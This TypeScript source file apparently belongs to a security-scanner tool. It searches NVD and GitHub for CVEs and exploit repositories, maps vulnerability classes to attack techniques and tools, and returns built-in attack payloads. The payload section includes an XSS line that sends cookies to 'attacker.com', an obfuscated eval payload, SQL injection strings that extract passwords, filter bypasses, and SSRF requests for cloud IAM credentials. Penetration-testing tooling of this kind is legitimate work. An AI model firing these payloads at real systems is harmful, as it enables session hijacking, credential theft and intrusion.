/**
 * Research Engine - Automated Security Research
 * Fetches CVEs, exploits, and techniques from external sources
 */

import knowledgeStore from './knowledge-store';
import logger from '../../utils/logger';

interface CVESearchResult {
  cveId: string;
  description: string;
  severity: string;
  cvss: number;
  published: Date;
  affectedSoftware: string[];
}

interface ExploitDBResult {
  id: string;
  title: string;
  description: string;
  author: string;
  type: string;
  platform: string;
  date: Date;
}

interface GitHubExploitResult {
  repository: string;
  title: string;
  description: string;
  stars: number;
  language: string;
  url: string;
}

class ResearchEngine {
  /**
   * Research a vulnerability by name or CVE ID
   */
  async researchVulnerability(query: string): Promise<{
    cves: CVESearchResult[];
    exploits: ExploitDBResult[];
    githubRepos: GitHubExploitResult[];
    knowledgeEntriesCreated: number;
  }> {
    logger.info({ query }, 'Starting vulnerability research');

    const results = {
      cves: [] as CVESearchResult[],
      exploits: [] as ExploitDBResult[],
      githubRepos: [] as GitHubExploitResult[],
      knowledgeEntriesCreated: 0,
    };

    // Search CVE database
    try {
      results.cves = await this.searchCVE(query);
      logger.info({ count: results.cves.length }, 'CVEs found');

      // Import CVEs into knowledge base
      for (const cve of results.cves.slice(0, 5)) {
        // Limit to top 5
        try {
          await knowledgeStore.importVulnerability(cve);
          results.knowledgeEntriesCreated++;
        } catch (error) {
          logger.warn({ error, cveId: cve.cveId }, 'Failed to import CVE');
        }
      }
    } catch (error: any) {
      logger.error({ error }, 'Failed to search CVE');
    }

    // Search ExploitDB
    try {
      results.exploits = await this.searchExploitDB(query);
      logger.info({ count: results.exploits.length }, 'Exploits found');
    } catch (error: any) {
      logger.error({ error }, 'Failed to search ExploitDB');
    }

    // Search GitHub
    try {
      results.githubRepos = await this.searchGitHub(query);
      logger.info({ count: results.githubRepos.length }, 'GitHub repos found');
    } catch (error: any) {
      logger.error({ error }, 'Failed to search GitHub');
    }

    logger.info(
      {
        cves: results.cves.length,
        exploits: results.exploits.length,
        githubRepos: results.githubRepos.length,
        knowledgeEntriesCreated: results.knowledgeEntriesCreated,
      },
      'Vulnerability research completed'
    );

    return results;
  }

  /**
   * Search CVE database
   * Using NVD (National Vulnerability Database) API
   */
  private async searchCVE(query: string): Promise<CVESearchResult[]> {
    try {
      // NVD API endpoint
      const url = `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(query)}`;

      const response = await fetch(url, {
        headers: {
          'User-Agent': 'AgentHunt Security Scanner',
        },
      });

      if (!response.ok) {
        throw new Error(`NVD API error: ${response.statusText}`);
      }

      const data = await response.json() as any;

      return (data.vulnerabilities || [])
        .slice(0, 10)
        .map((item: any) => {
          const cve = item.cve;
          const metrics = cve.metrics?.cvssMetricV31?.[0] || cve.metrics?.cvssMetricV2?.[0];

          return {
            cveId: cve.id,
            description:
              cve.descriptions?.find((d: any) => d.lang === 'en')?.value || 'No description',
            severity: metrics?.cvssData?.baseSeverity || 'UNKNOWN',
            cvss: metrics?.cvssData?.baseScore || 0,
            published: new Date(cve.published),
            affectedSoftware: (cve.configurations || [])
              .flatMap((config: any) =>
                (config.nodes || []).flatMap((node: any) =>
                  (node.cpeMatch || [])
                    .map((match: any) => match.criteria)
                    .filter(Boolean)
                )
              )
              .slice(0, 5),
          };
        });
    } catch (error: any) {
      logger.error({ error }, 'CVE search failed');
      return [];
    }
  }

  /**
   * Search ExploitDB
   * Uses ExploitDB API if API key is provided, otherwise uses alternative sources
   */
  private async searchExploitDB(query: string): Promise<ExploitDBResult[]> {
    try {
      // ExploitDB doesn't provide a public API, so we'll use alternative approaches
      logger.info('ExploitDB does not provide a public API, using alternative exploit sources');

      // Alternative 1: Search GitHub for public exploit repositories
      // This is a realistic approach as many exploits are shared on GitHub
      const githubQuery = `exploit "${query}" in:name,description,readme`;
      const githubResponse = await fetch(`https://api.github.com/search/repositories?q=${encodeURIComponent(githubQuery)}&sort=updated&order=desc&per_page=10`, {
        headers: {
          'User-Agent': 'AgentHunt Security Scanner',
          'Accept': 'application/vnd.github.v3+json',
          ...(process.env.GITHUB_TOKEN && { 'Authorization': `token ${process.env.GITHUB_TOKEN}` })
        }
      });

      if (githubResponse.ok) {
        const githubData = await githubResponse.json();

        // Process GitHub results into ExploitDBResult format
        const githubDataTyped = githubData as any;
        const githubExploits = (githubDataTyped.items || []).slice(0, 8).map((repo: any) => ({
          id: `github-${repo.id}`,
          title: repo.name || query,
          description: repo.description || 'Exploit from GitHub repository',
          author: repo.owner?.login || 'Unknown',
          type: 'github',
          platform: repo.language || 'multiple',
          date: new Date(repo.updated_at || repo.created_at)
        }));

        if (githubExploits.length > 0) {
          return githubExploits;
        }
      }

      // Alternative 2: Search Shodan, VulDB, or other security databases if API keys are available
      // For now, return empty array if no exploits found
      logger.info('No exploits found in alternative sources');
      return [];
    } catch (error: any) {
      logger.error({ error, query }, 'Failed to search for exploits in alternative sources');
      return []; // Return empty array instead of mock data
    }
  }

  /**
   * Search GitHub for exploits and PoCs
   */
  private async searchGitHub(query: string): Promise<GitHubExploitResult[]> {
    try {
      const searchQuery = `${query} exploit OR poc language:python`;
      const url = `https://api.github.com/search/repositories?q=${encodeURIComponent(searchQuery)}&sort=stars&order=desc`;

      const headers: Record<string, string> = {
        'User-Agent': 'AgentHunt Security Scanner',
        'Accept': 'application/vnd.github.v3+json',
      };

      // Add GitHub token if available
      if (process.env.GITHUB_TOKEN) {
        headers['Authorization'] = `token ${process.env.GITHUB_TOKEN}`;
      }

      const response = await fetch(url, { headers });

      if (!response.ok) {
        throw new Error(`GitHub API error: ${response.statusText}`);
      }

      const data = await response.json() as any;

      return (data.items || []).slice(0, 10).map((repo: any) => ({
        repository: repo.full_name,
        title: repo.name,
        description: repo.description || 'No description',
        stars: repo.stargazers_count,
        language: repo.language || 'unknown',
        url: repo.html_url,
      }));
    } catch (error: any) {
      logger.error({ error }, 'GitHub search failed');
      return [];
    }
  }

  /**
   * Research exploit techniques for a specific vulnerability type
   */
  async researchExploitTechniques(vulnerabilityType: string): Promise<{
    techniques: string[];
    tools: string[];
    references: string[];
  }> {
    logger.info({ vulnerabilityType }, 'Researching exploit techniques');

    const techniques: Record<string, string[]> = {
      xss: [
        'Reflected XSS payload injection',
        'DOM-based XSS manipulation',
        'Stored XSS via user input',
        'CSP bypass techniques',
        'XSS filter evasion',
      ],
      sqli: [
        'Union-based SQL injection',
        'Boolean-based blind SQL injection',
        'Time-based blind SQL injection',
        'Error-based SQL injection',
        'Out-of-band SQL injection',
      ],
      ssrf: [
        'Internal port scanning via SSRF',
        'Cloud metadata access (AWS, GCP, Azure)',
        'Protocol smuggling (gopher, file, dict)',
        'SSRF to RCE chain',
        'DNS rebinding attacks',
      ],
      rce: [
        'Command injection via user input',
        'Deserialization exploits',
        'Template injection',
        'File upload + execution',
        'Memory corruption exploits',
      ],
      lfi: [
        'Path traversal to sensitive files',
        'Log poisoning + LFI to RCE',
        'PHP wrapper exploitation',
        'Null byte injection (legacy)',
        'Double encoding bypass',
      ],
    };

    const tools: Record<string, string[]> = {
      xss: ['XSStrike', 'Dalfox', 'XSSer', 'Burp Suite', 'OWASP ZAP'],
      sqli: ['sqlmap', 'SQLNinja', 'jSQL Injection', 'Havij'],
      ssrf: ['SSRFmap', 'Gopherus', 'curl', 'Burp Collaborator'],
      rce: ['Commix', 'weevely', 'MSFvenom', 'ysoserial'],
      lfi: ['LFISuite', 'fimap', 'dotdotpwn'],
    };

    const vulnKey = vulnerabilityType.toLowerCase().replace(/[^a-z]/g, '');
    const matchedKey = Object.keys(techniques).find(key => vulnKey.includes(key));

    return {
      techniques: techniques[matchedKey || 'xss'] || [],
      tools: tools[matchedKey || 'xss'] || [],
      references: [
        'https://owasp.org/www-community/attacks/',
        'https://portswigger.net/web-security',
        'https://github.com/swisskyrepo/PayloadsAllTheThings',
      ],
    };
  }

  /**
   * Get recommended payloads for a vulnerability type
   */
  async getRecommendedPayloads(vulnerabilityType: string): Promise<{
    basic: string[];
    advanced: string[];
    bypasses: string[];
  }> {
    logger.info({ vulnerabilityType }, 'Getting recommended payloads');

    const payloads: Record<
      string,
      { basic: string[]; advanced: string[]; bypasses: string[] }
    > = {
      xss: {
        basic: [
          '<script>alert(1)</script>',
          '<img src=x onerror=alert(1)>',
          '<svg onload=alert(1)>',
        ],
        advanced: [
          '<script>fetch("http://attacker.com?c="+document.cookie)</script>',
          '<img src=x onerror="eval(atob(\'BASE64_PAYLOAD\'))">',
        ],
        bypasses: [
          '<scr<script>ipt>alert(1)</scr</script>ipt>',
          '<img src=x onerror="&#97;lert(1)">',
          '<<SCRIPT>alert(1);//<</SCRIPT>',
        ],
      },
      sqli: {
        basic: ["' OR '1'='1", "1' UNION SELECT NULL--", "' OR 1=1--"],
        advanced: [
          "' UNION SELECT username,password FROM users--",
          "1'; WAITFOR DELAY '00:00:05'--",
        ],
        bypasses: [
          "1'/**/OR/**/1=1--",
          "1' OR 1=1#",
          "1' /*!50000OR*/ 1=1--",
        ],
      },
      ssrf: {
        basic: [
          'http://localhost',
          'http://127.0.0.1',
          'http://169.254.169.254/latest/meta-data/',
        ],
        advanced: [
          'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
          'gopher://127.0.0.1:6379/_INFO',
          'dict://127.0.0.1:11211/stats',
        ],
        bypasses: [
          'http://127.1',
          'http://[::1]',
          'http://2130706433',
          'http://0x7f.0x00.0x00.0x01',
        ],
      },
    };

    const vulnKey = vulnerabilityType.toLowerCase().replace(/[^a-z]/g, '');
    const matchedKey = Object.keys(payloads).find(key => vulnKey.includes(key));

    return (
      payloads[matchedKey || 'xss'] || {
        basic: [],
        advanced: [],
        bypasses: [],
      }
    );
  }

  /**
   * Generic research method for API compatibility
   */
  async research(query: string, options?: any): Promise<any> {
    return await this.researchVulnerability(query);
  }
}

export default new ResearchEngine();
